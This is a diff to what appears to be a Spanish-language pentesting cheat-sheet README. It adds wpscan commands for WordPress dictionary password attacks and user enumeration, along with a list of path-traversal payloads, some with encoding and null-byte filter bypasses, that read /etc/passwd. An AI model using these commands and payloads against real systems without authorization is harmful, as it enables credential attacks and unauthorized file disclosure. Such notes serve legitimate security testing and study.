@@ -43,10 +43,27 @@ Mi repositorio sobre herramientas y configuraciones para la fase de reconocimien
 - nikto -h example.com -port 8083
 - nikto -h example.com -maxtime number.of.seconds
 ```
-
-# LFI 
+# Wpscan
 ```shell
-foo.php?file=../../../../../../../etc/passwd
+- wpscan --url <url>
+```
+### Ataque de diccionario
+```shell
+- - wpscan --url <url> --passwords <ruta de diccionarios>
+```
+### Enumerar usuarios
+```shell
+- wpscan --url <url> --enumerate u 
+```
+
+# Path Traversal 
+```shell
+- file=../../../../../../../etc/passwd
+- file=/etc/passwd
+- file=....//....//....//etc/passwd
+- file=..%252f..%252f..%252fetc/passwd
+- file=/var/www/images/../../../etc/passwd
+- file=../../../etc/passwd%00.png 
 ```
 
 # Upload extensions
